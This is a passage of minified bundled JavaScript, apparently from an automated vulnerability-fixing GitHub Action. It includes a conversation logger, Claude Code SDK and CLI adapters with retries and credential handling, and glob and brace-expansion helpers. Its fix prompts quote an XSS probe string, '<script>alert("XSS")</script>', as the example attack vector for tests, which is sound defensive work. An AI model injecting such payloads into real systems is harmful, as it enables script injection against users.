Set("ABCDEFGHIJKLMNOPQRSTUVXYZabcdefghijklmnopqrstuvxyz0123456789");M2={ZodString:"string",ZodNumber:"number",ZodBigInt:"integer",ZodBoolean:"boolean",ZodNull:"null"};(function(X){X.Completable="McpCompletable"})(VH||(VH={}));F2=class F2 extends H0{_parse(X){let{ctx:J}=this._processInputParams(X),Q=J.data;return this._def.type._parse({data:Q,path:J.path,parent:J})}unwrap(){return this._def.type}};F2.create=(X,J)=>{return new F2({type:X,typeName:VH.Completable,complete:J.complete,...Iy1(J)})};Cy1={type:"object",properties:{}};B2={completion:{values:[],hasMore:!1}}});import*as W6 from"fs/promises";import*as D2 from"path";var E6;var wL=j1(()=>{t1();E6=class E6{static logger=new nQ;static instance=null;logDir;enabled;logLevel;constructor(){this.logLevel=process.env.AI_CONVERSATION_LOG_LEVEL||"none",this.enabled=this.logLevel!=="none",this.logDir=process.env.AI_CONVERSATION_LOG_DIR||"./ai-conversation-logs"}static getInstance(){if(!this.instance)this.instance=new E6;return this.instance}async initialize(){if(!this.enabled)return;try{await W6.mkdir(this.logDir,{recursive:!0}),E6.logger.info(`Conversation logging initialized (level: ${this.logLevel}, dir: ${this.logDir})`)}catch(X){E6.logger.error(`Failed to create log directory: ${X}`),this.enabled=!1}}async logConversation(X){if(!this.enabled)return;try{let Q=`${new Date().toISOString().replace(/[:.]/g,"-")}_${X.issueId}_${X.provider}.json`,Y=D2.join(this.logDir,Q),W;if(this.logLevel==="full")W=X;else if(this.logLevel==="summary")W={...X,messages:X.messages.map((G)=>({role:G.role,contentLength:G.content?.length||0,toolUse:G.tool_use?.map((H)=>H.name)||[],timestamp:G.timestamp}))};await W6.writeFile(Y,JSON.stringify(W,null,2)),E6.logger.debug(`Logged conversation to ${Q}`);let z=D2.join(this.logDir,"latest.json");try{await W6.unlink(z).catch(()=>{}),await W6.symlink(Q,z)}catch{}}catch(J){E6.logger.error(`Failed to log conversation: ${J}`)}}async logSummary(X,J){if(!this.enabled)return;try{let Q=D2.join(this.logDir,"summary.log"),W=`${new Date().toISOString()} [${X}] ${J}
`;await W6.appendFile(Q,W)}catch(Q){E6.logger.error(`Failed to log summary: ${Q}`)}}getLogDirectory(){return this.logDir}isEnabled(){return this.enabled}}});import tX from"path";import G6 from"fs";class $6{repoPath;config;claudeConfig;tempDir;usageData=[];credentialManager;conversationLogger;constructor(X,J=process.cwd(),Q){if(this.config=X,this.repoPath=J,this.credentialManager=Q,this.claudeConfig=X.claudeCodeConfig||{},this.tempDir=this.claudeConfig.tempDir||tX.join(process.cwd(),"temp"),this.conversationLogger=E6.getInstance(),this.conversationLogger.initialize().catch((Y)=>{q.warn("Failed to initialize conversation logger:",Y)}),!G6.existsSync(this.tempDir))try{G6.mkdirSync(this.tempDir,{recursive:!0})}catch(Y){q.warn(`Failed to create temp directory: ${Y}`)}if(this.claudeConfig.verboseLogging)q.info("Claude Code SDK adapter initialized with config:",JSON.stringify({tempDir:this.tempDir,contextOptions:this.claudeConfig.contextOptions,retryOptions:this.claudeConfig.retryOptions,timeout:this.claudeConfig.timeout},null,2))}async isAvailable(){try{let{query:X}=await Promise.resolve().then(() => (wH(),DL));this.claudeConfig.executablePath;let J=[this.claudeConfig.executablePath,tX.join(__dirname,"..","..","..","node_modules","@anthropic-ai","claude-code","cli.js"),tX.join(process.cwd(),"node_modules","@anthropic-ai","claude-code","cli.js"),"/home/dylan/dev/rsolv/RSOLV-action/node_modules/@anthropic-ai/claude-code/cli.js"].filter(Boolean),Y=J.find((z)=>z&&G6.existsSync(z))||(J.length>0&&J[0]?J[0]:"/dev/null");if(!G6.existsSync(Y))return q.warn(`Claude Code executable not found at: ${Y}`),!1;return!0}catch(X){return q.error("Claude Code SDK not available",X),!1}}async generateSolution(X,J,Q){let Y=0,W=this.claudeConfig.retryOptions?.maxRetries??2,z=this.claudeConfig.timeout??1800000,G={startTime:Date.now(),issueId:X.id,successful:!1};try{if(q.info(`Generating solution using Claude Code SDK for issue: ${X.id}`),!await this.isAvailable())return q.warn("Claude Code CLI not available"),G.errorType="cli_not_available",this.trackUsage(G),{success:!1,message:"Claude Code CLI not available",error:`Claude Code CLI not available. Please ensure @anthropic-ai/claude-code is installed and the executable path is correct.

Installation instructions:
1. Install Claude Code: npm install -g @anthropic-ai/claude-code
2. Verify installation: claude -v
3. Visit https://claude.ai/console/claude-code for more information`};let U=this.constructPrompt(X,J,Q),K=this.config.apiKey;if(this.config.useVendedCredentials&&this.credentialManager)try{K=this.credentialManager.getCredential("anthropic"),q.info("Using vended Anthropic credential for Claude Code SDK")}catch(N){q.warn("Failed to get vended credential, falling back to config API key",N)}process.env.ANTHROPIC_API_KEY=K;let V=new AbortController,B=setTimeout(()=>{V.abort()},z),Z=[],M=null,F=!0,j=0,O=Date.now();try{if(this.claudeConfig.verboseLogging)q.info(`Starting Claude Code exploration for issue: ${X.title}`);await this.conversationLogger.logSummary(X.id,`Starting Claude Code conversation for issue: ${X.title}`);let N=tX.join(this.repoPath,"mcp-config.json"),A=G6.existsSync(N),D={abortController:V,cwd:this.repoPath,maxTurns:30,pathToClaudeCodeExecutable:(()=>{let T=[this.claudeConfig.executablePath,tX.join(__dirname,"..","..","..","node_modules","@anthropic-ai","claude-code","cli.js"),tX.join(process.cwd(),"node_modules","@anthropic-ai","claude-code","cli.js"),"/home/dylan/dev/rsolv/RSOLV-action/node_modules/@anthropic-ai/claude-code/cli.js"].filter(Boolean);return T.find((E)=>E&&G6.existsSync(E))||(T.length>0&&T[0]?T[0]:"/dev/null")})()};if(this.claudeConfig?.useStructuredPhases)D.mcpConfig=null,q.info("Disabled MCP for structured phases - using core Edit/MultiEdit tools only");else if(A)D.mcpConfig=N,q.info("Using MCP configuration from mcp-config.json, including sequential thinking");for await(let T of DH({prompt:U,options:D})){if(Z.push(T),j++,this.claudeConfig.verboseLogging&&T.type==="assistant"){let k=T;if(k.message?.content){for(let E of k.message.content)if(E.type==="tool_use")q.debug(`Claude exploring: ${E.name} tool`),F=!0;else if(E.type==="text"&&E.text){if(E.text.includes("```json")||E.text.includes("ultimate solution")||E.text.includes("Final Output"))F=!1,q.info("Claude transitioning to solution generation phase")}}}if(T.type==="assistant"&&T.text){let k=this.extractSolutionFromText(T.text);if(k){if(M=k,this.claudeConfig.verboseLogging)q.info("Found solution in text message")}}if(T.type==="assistant"){let k=T;if(k.message?.content){for(let E of k.message.content)if(E.type==="text"&&E.text){let y=this.extractSolutionFromText(E.text);if(y){if(M=y,this.claudeConfig.verboseLogging)q.info("Found solution in assistant message")}}}}if(T.type==="result"||T.type==="final_result"){let k=T;if(this.claudeConfig.verboseLogging)q.info(`Received ${T.type} message from Claude Code SDK`);if(k.text){let E=this.extractSolutionFromText(k.text);if(E)M=E,q.info("Found solution in result message")}else if(k.content){let E=this.extractSolutionFromText(typeof k.content==="string"?k.content:JSON.stringify(k.content));if(E)M=E,q.info("Found solution in result message content")}}}clearTimeout(B),G.endTime=Date.now(),G.solutionGenerationTime=G.endTime-G.startTime;let $={issueId:X.id,timestamp:new Date().toISOString(),provider:"anthropic",model:"claude-code",messages:Z.map((T)=>({type:T.type,content:T,timestamp:new Date().toISOString()})),metadata:{workflowRun:process.env.GITHUB_RUN_ID,workflowJob:process.env.GITHUB_JOB,repository:process.env.GITHUB_REPOSITORY,issueNumber:parseInt(X.id.split("#")[1]||"0"),duration:Date.now()-O,tokenUsage:{prompt:0,completion:0,total:0}},result:{success:!!M,solutionGenerated:!!M}};if(await this.conversationLogger.logConversation($),M){if(G.successful=!0,this.trackUsage(G),this.claudeConfig.verboseLogging)q.info(`Claude Code completed exploration with ${j} messages`),q.info(`Solution found with ${M.files.length} file(s) to change`);await this.conversationLogger.logSummary(X.id,`Claude Code conversation completed successfully with ${j} messages and ${M.files.length} files changed`);let T={};return M.files.forEach((k)=>{T[k.path]=k.changes}),{success:!0,message:`Solution generated with Claude Code SDK after ${j} exploration steps`,changes:T,messages:Z}}else{if(q.warn(`No solution found in Claude Code SDK response after ${j} messages`),G.errorType="no_solution_found",this.trackUsage(G),await this.conversationLogger.logSummary(X.id,`Claude Code conversation completed without solution after ${j} messages`),Z.length>0){let T=Z.slice(-5);q.warn("Last 5 messages from Claude Code SDK:"),T.forEach((E,y)=>{let a={index:Z.length-5+y,type:E.type,hasText:!!E.text,hasContent:!!E.content,hasMessage:!!E.message};if(E.text)a.textPreview=E.text.slice(0,200);if(E.content){if(a.contentType=typeof E.content,typeof E.content==="string")a.contentPreview=E.content.slice(0,200)}if(E.message?.content)a.messageContent=Array.isArray(E.message.content)?E.message.content.map((p)=>({type:p.type,hasText:!!p.text})):"not an array";q.warn(`Message ${a.index}:`,a)});let k=Z.find((E)=>E.type==="result"||E.type==="final_result");if(k)q.warn("Found result message but could not extract solution:",{type:k.type,hasText:!!k.text,hasContent:!!k.content,keys:Object.keys(k)});else q.warn("No result/final_result message found in conversation")}return{success:!1,message:"No solution found in response",error:`Claude Code explored the repository (${j} steps) but did not generate a valid JSON solution. This might indicate the issue requires more context or manual intervention.`,messages:Z}}}catch(N){let A=N.message||String(N),D=N.name==="AbortError"||A.includes("AbortError")?"timeout":"query_error",S={issueId:X.id,timestamp:new Date().toISOString(),provider:"anthropic",model:"claude-code",messages:Z.map(($)=>({type:$.type,content:$,timestamp:new Date().toISOString()})),metadata:{workflowRun:process.env.GITHUB_RUN_ID,workflowJob:process.env.GITHUB_JOB,repository:process.env.GITHUB_REPOSITORY,issueNumber:parseInt(X.id.split("#")[1]||"0"),duration:Date.now()-O},result:{success:!1,error:A}};if(await this.conversationLogger.logConversation(S),await this.conversationLogger.logSummary(X.id,`Claude Code conversation failed: ${D} - ${A}`),D==="timeout")return q.error(`Claude Code SDK execution timed out after ${z/1000} seconds`),G.errorType="timeout",G.endTime=Date.now(),this.trackUsage(G),{success:!1,message:"Claude Code SDK execution failed",error:`Claude Code SDK execution timed out after ${z/1000} seconds`};else return q.error("Claude Code SDK query failed",N),G.errorType="query_error",G.endTime=Date.now(),this.trackUsage(G),{success:!1,message:"Claude Code SDK execution failed",error:`Claude Code SDK execution failed: ${A}`}}finally{clearTimeout(B)}}catch(H){return q.error("Unexpected error generating solution with Claude Code SDK",H),G.errorType="unexpected_error",G.endTime=Date.now(),this.trackUsage(G),{success:!1,message:"Unexpected error using Claude Code SDK",error:H instanceof Error?H.message:String(H)}}}trackUsage(X){if(this.claudeConfig.trackUsage!==!1){this.usageData.push(X);let J=tX.join(this.tempDir,"claude-code-analytics.json");try{if(this.claudeConfig.verboseLogging)q.debug(`Saving analytics to: ${J}`);let Q=[];if(G6.existsSync(J))Q=JSON.parse(G6.readFileSync(J,"utf-8"));if(Q.push(X),Q.length>100)Q=Q.slice(-100);if(G6.writeFileSync(J,JSON.stringify(Q,null,2)),this.claudeConfig.verboseLogging)q.debug(`Analytics saved successfully with ${Q.length} entries`)}catch(Q){q.warn("Error saving analytics data",Q)}if(this.claudeConfig.verboseLogging){let Q=X.endTime?(X.endTime-X.startTime)/1000:0;q.info(`Usage stats for issue ${X.issueId}: ${X.successful?"Success":"Failed"} in ${Q.toFixed(1)}s`)}}}constructPrompt(X,J,Q){if(Q)return Q;return`You are an expert developer tasked with fixing an issue in a codebase. I need you to explore the repository, understand the problem deeply, and create a comprehensive solution.

## Issue Details:
- **Title**: ${X.title}
- **Description**: ${X.body}
- **Complexity**: ${J.complexity}
- **Estimated Time**: ${J.estimatedTime} minutes
- **Initial Related Files**: ${J.relatedFiles?.join(", ")||"To be discovered through exploration"}

## Your Task:

### Phase 1: Repository Exploration
First, explore the repository structure to understand:
- The overall architecture and file organization
- Where the vulnerability or issue might be located
- Related components that might be affected
- Existing patterns and coding standards

Use tools like Grep, Glob, and Read to explore the codebase thoroughly.

### Phase 2: Deep Analysis
Once you understand the codebase:
- Locate the exact source of the issue
- Understand how the vulnerable code works
- Identify all files that need changes
- Consider security implications and edge cases

### Phase 3: Solution Development
Develop your solution iteratively:
- Start with the core fix
- Add necessary validation and error handling
- Ensure the fix follows existing code patterns
- Consider adding tests if appropriate

### Phase 4: Final Output
After you've completed your exploration and solution development, provide your ultimate solution as a JSON object with this EXACT structure:

\`\`\`json
{
  "title": "Brief title for the PR (e.g., 'Fix XSS vulnerability in login form')",
  "description": "Detailed description explaining what was vulnerable, why it was dangerous, and how your fix addresses it",
  "files": [
    {
      "path": "exact/path/to/file.js",
      "changes": "The COMPLETE new content for the file (not a diff, but the full file content after changes)"
    }
  ],
  "tests": [
    "Description of test case 1 to verify the fix",
    "Description of test case 2 for edge cases"
  ]
}
\`\`\`

Remember: Take your time to explore and understand the codebase thoroughly before implementing the solution. The final JSON must be properly formatted and include the complete file contents after your changes.`}extractSolutionFromText(X){try{let J=X.match(/```(?:json)?\s*([\s\S]*?)\s*```/);if(J){let Y=JSON.parse(J[1]);if(Y.title&&Y.description&&Array.isArray(Y.files))return q.debug("Successfully extracted solution from JSON code block"),{title:Y.title,description:Y.description,files:Y.files,tests:Y.tests||[]}}let Q=JSON.parse(X);if(Q.title&&Q.description&&Array.isArray(Q.files))return q.debug("Successfully parsed solution directly from text"),{title:Q.title,description:Q.description,files:Q.files,tests:Q.tests||[]}}catch(J){q.debug("Could not extract JSON solution from text")}return null}getUsageData(){return this.usageData}getAnalyticsSummary(){let X=this.usageData.length;if(X===0)return{total:0};let J=this.usageData.filter((G)=>G.successful).length,Q=J/X*100,Y=this.usageData.filter((G)=>G.endTime!==void 0).map((G)=>(G.endTime-G.startTime)/1000).reduce((G,H)=>G+H,0)/X,W=this.usageData.filter((G)=>G.cost!==void 0).map((G)=>G.cost).reduce((G,H)=>G+H,0),z=this.usageData.filter((G)=>G.errorType).reduce((G,H)=>{let U=H.errorType;return G[U]=(G[U]||0)+1,G},{});return{total:X,successful:J,successRate:Q.toFixed(1)+"%",avgDuration:Y.toFixed(1)+"s",totalCost:"$"+W.toFixed(4),errorTypes:z}}}var __dirname="/home/dylan/dev/rsolv/RSOLV-action/src/ai/adapters";var qQ=j1(()=>{wH();t1();wL()});import{spawn as Ey1}from"child_process";class IH{claudeConfig;repoPath;credentialManager;constructor(X,J=process.cwd(),Q){this.claudeConfig=X,this.repoPath=J,this.credentialManager=Q}async generateSolution(X,J,Q){try{q.info("Using Claude Code CLI for file editing...");let Y=process.env.ANTHROPIC_API_KEY;if(!Y&&this.credentialManager)try{if(Y=this.credentialManager.getCredential("anthropic"),Y)q.info("Using vended credentials for Claude Code CLI")}catch(K){q.warn("Failed to get vended credentials:",K)}if(!Y)return{success:!1,message:"CLI execution failed",error:"ANTHROPIC_API_KEY environment variable or vended credentials required for CLI approach"};let W=Q||this.constructPrompt(X,J);q.info(`Working directory: ${this.repoPath}`),q.info(`Prompt length: ${W.length} characters`);let z=await this.executeCLI(W,{cwd:this.repoPath,env:{...process.env,ANTHROPIC_API_KEY:Y}});if(!z.success)return{success:!1,message:z.error||"Claude Code CLI execution failed",error:z.error};let G=this.getModifiedFiles();if(G.length===0)return{success:!1,message:"No files were modified by Claude Code CLI",error:"Claude Code CLI did not make any file changes"};q.info(`Files modified by Claude Code CLI: ${G.join(", ")}`);let H={},U=z.output?.match(/```(?:json)?\s*(\{[\s\S]*?\})\s*```/);if(U)try{let K=JSON.parse(U[1]);if(K.files&&Array.isArray(K.files))K.files.forEach((V)=>{if(V.path&&V.changes)H[V.path]=V.changes})}catch(K){q.debug("Could not parse JSON from CLI output")}return{success:!0,message:`Successfully fixed vulnerabilities in ${G.length} file(s)`,changes:H,messages:[{type:"cli_output",content:z.output}]}}catch(Y){return q.error("Claude Code CLI execution failed:",Y),{success:!1,message:"CLI execution failed",error:Y instanceof Error?Y.message:String(Y)}}}executeCLI(X,J){return new Promise((Q)=>{let Y=setTimeout(()=>{if(q.warn("Claude CLI execution timed out after 20 minutes"),W&&!W.killed)W.kill("SIGTERM");Q({success:!1,error:"Claude CLI execution timed out after 20 minutes"})},1200000),W,z=process.env.CLAUDE_MODEL?["--model",process.env.CLAUDE_MODEL]:[],G=[["claude",["--print","--permission-mode","acceptEdits",...z,"-"]],["bunx",["@anthropic-ai/claude-code","--print","--permission-mode","acceptEdits",...z,"-"]],["bun",["node_modules/@anthropic-ai/claude-code/cli.js","--print","--permission-mode","acceptEdits",...z,"-"]]],H=0,U=()=>{if(H>=G.length){Q({success:!1,error:"Could not find Claude Code CLI via bunx, bun, or global install"});return}let[K,V]=G[H];q.info(`Attempting: ${K} ${V.join(" ")}`),H++,W=Ey1(K,V,{...J,stdio:["pipe","pipe","pipe"]}),W.stdin.write(X),W.stdin.end();let B="",Z="";W.stdout?.on("data",(M)=>{let F=M.toString();B+=F,q.debug(`Claude CLI stdout: ${F.slice(0,200)}`),process.stdout.write(F)}),W.stderr?.on("data",(M)=>{let F=M.toString();Z+=F,process.stderr.write(F)}),W.on("close",(M)=>{if(clearTimeout(Y),M===0)Q({success:!0,output:B});else Q({success:!1,error:`Claude CLI exited with code ${M}. stderr: ${Z}`})}),W.on("error",(M)=>{if(H<G.length)q.debug(`Command ${K} failed with: ${M.message}, trying next approach...`),U();else clearTimeout(Y),Q({success:!1,error:`Failed to start Claude CLI: ${M.message}`})})};U()})}getModifiedFiles(){try{let{execSync:X}=m0("child_process"),J=X("git diff --name-only",{cwd:this.repoPath,encoding:"utf-8"}).trim();return J?J.split(`
`):[]}catch(X){return q.error("Failed to get modified files:",X),[]}}constructPrompt(X,J){if(this.claudeConfig?.useStructuredPhases)return this.constructStructuredPhasedPrompt(X,J);return`You are an expert security engineer fixing vulnerabilities using Test-Driven Development (TDD) methodology.

## Issue Details:
- **Title**: ${X.title}
- **Description**: ${X.body}
- **Complexity**: ${J.complexity}
- **Files with vulnerabilities**: ${J.relatedFiles?.join(", ")||"To be discovered"}

## CRITICAL: Use TDD Red-Green-Refactor Methodology

### Phase 1: RED - Prove the Vulnerability Exists
- Use Read to understand the vulnerable code
- Identify how the vulnerability can be exploited
- Document a test that WOULD exploit the vulnerability (e.g., for XSS: injecting '<script>alert("XSS")</script>')

### Phase 2: GREEN - Fix the Vulnerability
- Use Edit or MultiEdit tools to fix the security issue
- For XSS: Add proper HTML escaping/sanitization
- For SQL Injection: Use parameterized queries
- Make minimal changes that prevent the exploit

### Phase 3: REFACTOR - Ensure Quality
- Verify legitimate functionality still works
- Clean up the fix if needed
- Ensure no regressions were introduced

### Phase 4: Provide Fix Summary (ONLY AFTER EDITING FILES)
After completing the TDD cycle and editing files, provide this JSON:

\`\`\`json
{
  "title": "Fix [vulnerability type] in [component]",
  "description": "Clear explanation of what was vulnerable and how you fixed it",
  "files": [
    {
      "path": "path/to/file.js",
      "changes": "Complete fixed code content (use Read to get it if needed)"
    }
  ],
  "tests": [
    "RED test validates that malicious input like '<script>alert(\\"XSS\\")</script>' in [field] is properly escaped and cannot execute",
    "GREEN test ensures the fix prevents XSS by escaping dangerous characters in [field] input",
    "REFACTOR test confirms that valid [functionality] still works correctly and [feature] loads properly"
  ]
}
\`\`\`

Remember: Follow TDD - understand vulnerability (RED), fix it (GREEN), ensure quality (REFACTOR), THEN provide JSON.`}constructStructuredPhasedPrompt(X,J){return`You are an expert security engineer using Test-Driven Development (TDD) to fix vulnerabilities.

## \uD83D\uDEA8 CRITICAL: FOLLOW TDD RED-GREEN-REFACTOR METHODOLOGY \uD83D\uDEA8

## PHASE 1: RED - UNDERSTAND THE VULNERABILITY

1. Locate the vulnerability: ${X.title}
   - Description: ${X.body}
   - Related files: ${J.relatedFiles?.join(", ")||"To be discovered"}

2. Use Read to examine the vulnerable code

3. Identify the attack vector (e.g., for XSS: '<script>alert("XSS")</script>')

## PHASE 2: GREEN - FIX THE VULNERABILITY

1. Use Edit or MultiEdit tools to fix the vulnerable code
   - For XSS: Escape HTML entities (&, <, >, ", ')
   - For SQL Injection: Use parameterized queries
   - Make minimal changes that block the exploit

2. After editing, use Read tool to verify your fix

3. Say "GREEN PHASE COMPLETE: Vulnerability fixed" when done

## PHASE 3: REFACTOR - ENSURE QUALITY

1. Verify legitimate functionality still works
2. Clean up code if needed
3. Say "REFACTOR COMPLETE: Code quality verified"

## PHASE 4: JSON SUMMARY (ONLY AFTER ALL PHASES)

Provide this JSON with TDD test descriptions:

\`\`\`json
{
  "title": "Fix [vulnerability type] in [component]",
  "description": "Clear explanation using TDD: RED (vulnerability existed), GREEN (fix applied), REFACTOR (quality ensured)",
  "files": [
    {
      "path": "path/to/edited/file.js",
      "changes": "Complete file content after your edits (read it back with Read tool)"
    }
  ],
  "tests": [
    "RED test: Validates that malicious input like '<script>alert(\\"XSS\\")</script>' would have been exploitable before fix",
    "GREEN test: Ensures the fix prevents the vulnerability by properly escaping/sanitizing input",
    "REFACTOR test: Confirms legitimate functionality (e.g., livereload) still works correctly"
  ]
}
\`\`\`

## TDD Checklist:
 RED: Understood vulnerability and attack vector
 GREEN: Applied fix using Edit/MultiEdit tools
 REFACTOR: Verified no regressions
 Provided JSON with TDD test descriptions

Remember: Follow TDD methodology - RED (understand), GREEN (fix), REFACTOR (verify), then JSON.`}}var IL=j1(()=>{t1()});function $y1(){return process.env.RSOLV_DEV_MODE==="true"||process.env.USE_CLAUDE_CODE_MAX==="true"}var ZQ;var CH=j1(()=>{IL();t1();ZQ=class ZQ extends IH{defaultRetryConfig={maxAttempts:parseInt(process.env.RSOLV_RETRY_MAX_ATTEMPTS||"3"),initialDelayMs:parseInt(process.env.RSOLV_RETRY_INITIAL_DELAY_MS||"1000"),maxDelayMs:parseInt(process.env.RSOLV_RETRY_MAX_DELAY_MS||"30000"),backoffMultiplier:parseFloat(process.env.RSOLV_RETRY_BACKOFF_MULTIPLIER||"2"),retryableErrors:["rate_limit","overloaded","timeout","network","ECONNRESET","ETIMEDOUT","ENOTFOUND","EHOSTUNREACH","Claude CLI exited with code"]};async generateSolution(X,J,Q){try{q.info("Using RetryableClaudeCodeCLI for file editing...");let Y=$y1(),W=await this.getApiKey(Y);if(!W)return{success:!1,message:"No API key available",error:Y?"Claude Code Max API key not configured for development mode. Set CLAUDE_CODE_MAX_API_KEY or ANTHROPIC_API_KEY":"No API key or vended credentials available"};process.env.ANTHROPIC_API_KEY=W,q.info(`Using ${Y?"Claude Code Max (dev)":"production"} API`);let z=Q||this.constructPrompt(X,J);q.info(`Working directory: ${this.repoPath}`),q.info(`Prompt length: ${z.length} characters`);let G=await this.executeWithRetry(z,{cwd:this.repoPath,env:{...process.env,ANTHROPIC_API_KEY:W}});if(!G.success)return G;let H=this.getModifiedFiles();if(H.length===0)return{success:!1,message:"No files were modified by Claude Code CLI",error:"Claude Code CLI did not make any file changes"};q.info(`Files modified by Claude Code CLI: ${H.join(", ")}`);let U={};for(let K of H)U[K]="Modified by Claude Code CLI";return{success:!0,message:`Successfully modified ${H.length} file(s)`,changes:U}}catch(Y){return q.error("Failed to generate solution with retry:",Y),{success:!1,message:"Failed to generate solution",error:Y instanceof Error?Y.message:String(Y)}}}async executeWithRetry(X,J,Q){let Y={...this.defaultRetryConfig,...Q},W=null;for(let z=1;z<=Y.maxAttempts;z++){try{q.info(`Attempt ${z}/${Y.maxAttempts}: Executing Claude Code CLI`);let G=await this.executeCLI(X,J);if(G.success){if(z>1)q.info(`Succeeded on attempt ${z} after ${z-1} retry(ies)`);return{success:!0,message:G.output||"Operation completed successfully"}}if(!this.isRetryableError(G.error,Y.retryableErrors))return q.warn(`Non-retryable error: ${G.error}`),{success:!1,message:G.error||"Operation failed",error:G.error};W=new Error(G.error||"Unknown error"),q.warn(`Retryable error on attempt ${z}: ${G.error}`)}catch(G){if(W=G,!this.isRetryableError(W.message,Y.retryableErrors))throw q.error(`Non-retryable exception: ${W.message}`),G;q.warn(`Retryable exception on attempt ${z}: ${W.message}`)}if(z<Y.maxAttempts){let G=Math.min(Y.initialDelayMs*Math.pow(Y.backoffMultiplier,z-1),Y.maxDelayMs);q.info(`Retrying in ${G}ms (exponential backoff)...`),await this.sleep(G)}}return q.error(`Failed after ${Y.maxAttempts} attempts. Last error: ${W?.message}`),{success:!1,message:`Failed after ${Y.maxAttempts} attempts`,error:W?.message||"Unknown error"}}isRetryableError(X,J){if(!X)return!1;let Q=X.toLowerCase();return J.some((Y)=>Q.includes(Y.toLowerCase()))}sleep(X){return new Promise((J)=>setTimeout(J,X))}async getApiKey(X){if(X){let Q=process.env.CLAUDE_CODE_MAX_API_KEY;if(Q)return q.debug("Using Claude Code Max API key from CLAUDE_CODE_MAX_API_KEY"),Q;let Y=process.env.ANTHROPIC_API_KEY;if(Y)return q.debug("Using regular API key in dev mode (CLAUDE_CODE_MAX_API_KEY not set)"),Y;return}let J;if(this.credentialManager){q.info("Credential manager available, attempting to get Anthropic credentials");try{if(J=await this.credentialManager.getCredential("anthropic"),q.info(`Got credential from manager: ${J?"API key received (length: "+J.length+")":"No API key returned"}`),J)q.info("Using vended credentials for production mode")}catch(Q){q.warn("Failed to get vended credentials:",Q)}}else q.info("No credential manager available");if(!J){if(J=process.env.ANTHROPIC_API_KEY,J)q.debug("Using environment ANTHROPIC_API_KEY")}return J}}});var PH=(X,J,Q)=>{let Y=X instanceof RegExp?CL(X,Q):X,W=J instanceof RegExp?CL(J,Q):J,z=Y!==null&&W!=null&&ky1(Y,W,Q);return z&&{start:z[0],end:z[1],pre:Q.slice(0,z[0]),body:Q.slice(z[0]+Y.length,z[1]),post:Q.slice(z[1]+W.length)}},CL=(X,J)=>{let Q=J.match(X);return Q?Q[0]:null},ky1=(X,J,Q)=>{let Y,W,z,G=void 0,H,U=Q.indexOf(X),K=Q.indexOf(J,U+1),V=U;if(U>=0&&K>0){if(X===J)return[U,K];Y=[],z=Q.length;while(V>=0&&!H){if(V===U)Y.push(V),U=Q.indexOf(X,V+1);else if(Y.length===1){let B=Y.pop();if(B!==void 0)H=[B,K]}else{if(W=Y.pop(),W!==void 0&&W<z)z=W,G=K;K=Q.indexOf(J,V+1)}V=U<K&&U>=0?U:K}if(Y.length&&G!==void 0)H=[z,G]}return H};function SH(X){return!isNaN(X)?parseInt(X,10):X.charCodeAt(0)}function ly1(X){return X.replace(hy1,PL).replace(yy1,SL).replace(my1,TH).replace(uy1,TL).replace(cy1,_L)}function py1(X){return X.replace(by1,"\\").replace(vy1,"{").replace(xy1,"}").replace(fy1,",").replace(gy1,".")}function EL(X){if(!X)return[""];let J=[],Q=PH("{","}",X);if(!Q)return X.split(",");let{pre:Y,body:W,post:z}=Q,G=Y.split(",");G[G.length-1]+="{"+W+"}";let H=EL(z);if(z.length)G[G.length-1]+=H.shift(),G.push.apply(G,H);return J.push.apply(J,G),J}function $L(X){if(!X)return[];if(X.slice(0,2)==="{}")X="\\{\\}"+X.slice(2);return MQ(ly1(X),!0).map(py1)}function dy1(X){return"{"+X+"}"}function iy1(X){return/^-?0\d/.test(X)}function ry1(X,J){return X<=J}function ny1(X,J){return X>=J}function MQ(X,J){let Q=[],Y=PH("{","}",X);if(!Y)return[X];let W=Y.pre,z=Y.post.length?MQ(Y.post,!1):[""];if(/\$$/.test(Y.pre))for(let G=0;G<z.length;G++){let H=W+"{"+Y.body+"}"+z[G];Q.push(H)}else{let G=/^-?\d+\.\.-?\d+(?:\.\.-?\d+)?$/.test(Y.body),H=/^[a-zA-Z]\.\.[a-zA-Z](?:\.\.-?\d+)?$/.test(Y.body),U=G||H,K=Y.body.indexOf(",")>=0;if(!U&&!K){if(Y.post.match(/,(?!,).*\}/))return X=Y.pre+"{"+Y.body+TH+Y.post,MQ(X);return[X]}let V;if(U)V=Y.body.split(/\.\./);else if(V=EL(Y.body),V.length===1&&V[0]!==void 0){if(V=MQ(V[0],!1).map(dy1),V.length===1)return z.map((Z)=>Y.pre+V[0]+Z)}let B;if(U&&V[0]!==void 0&&V[1]!==void 0){let Z=SH(V[0]),M=SH(V[1]),F=Math.max(V[0].length,V[1].length),j=V.length===3&&V[2]!==void 0?Math.abs(SH(V[2])):1,O=ry1;if(M<Z)j*=-1,O=ny1;let A=V.some(iy1);B=[];for(let D=Z;O(D,M);D+=j){let S;if(H){if(S=String.fromCharCode(D),S==="\\")S=""}else if(S=String(D),A){let $=F-S.length;if($>0){let T=new Array($+1).join("0");if(D<0)S="-"+T+S.slice(1);else S=T+S}}B.push(S)}}else{B=[];for(let Z=0;Z<V.length;Z++)B.push.apply(B,MQ(V[Z],!1))}for(let Z=0;Z<B.length;Z++)for(let M=0;M<z.length;M++){let F=W+B[Z]+z[M];if(!J||U||F)Q.push(F)}}return Q}var PL,SL,TH,TL,_L,by1,vy1,xy1,fy1,gy1,hy1,yy1,my1,uy1,cy1;var kL=j1(()=>{PL="\x00SLASH"+Math.random()+"\x00",SL="\x00OPEN"+Math.random()+"\x00",TH="\x00CLOSE"+Math.random()+"\x00",TL="\x00COMMA"+Math.random()+"\x00",_L="\x00PERIOD"+Math.random()+"\x00",by1=new RegExp(PL,"g"),vy1=new RegExp(SL,"g"),xy1=new RegExp(TH,"g"),fy1=new RegExp(TL,"g"),gy1=new RegExp(_L,"g"),hy1=/\\\\/g,yy1=/\\{/g,my1=/\\}/g,uy1=/\\,/g,cy1=/\\./g});var FQ=(X)=>{if(typeof X!=="string")throw new TypeError("invalid pattern");if(X.length>65536)throw new TypeError("pattern is too long")};var ay1,jQ=(X)=>X.replace(/[[\]\\-]/g,"\\$&"),sy1=(X)=>X.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&"),bL=(X)=>X.join(""),vL=(X,J)=>{let Q=J;if(X.charAt(Q)!=="[")throw new Error("not in a brace expression");let Y=[],W=[],z=Q+1,G=!1,H=!1,U=!1,K=!1,V=Q,B="";X:while(z<X.length){let 